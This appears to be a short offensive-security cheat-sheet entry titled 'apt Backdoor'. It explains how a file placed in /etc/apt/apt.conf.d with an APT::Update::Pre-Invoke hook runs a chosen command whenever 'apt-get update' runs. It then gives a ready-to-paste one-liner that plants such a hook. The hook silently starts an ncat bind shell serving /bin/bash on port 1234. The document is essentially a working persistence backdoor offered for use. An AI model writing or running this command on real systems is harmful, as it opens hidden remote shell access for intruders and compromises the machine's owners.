# apt Backdoor

If you can create a file on the apt.conf.d directory with: `APT::Update::Pre-Invoke {"CMD"};` Next time "apt-get update" is done, your CMD will be executed!

```
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```
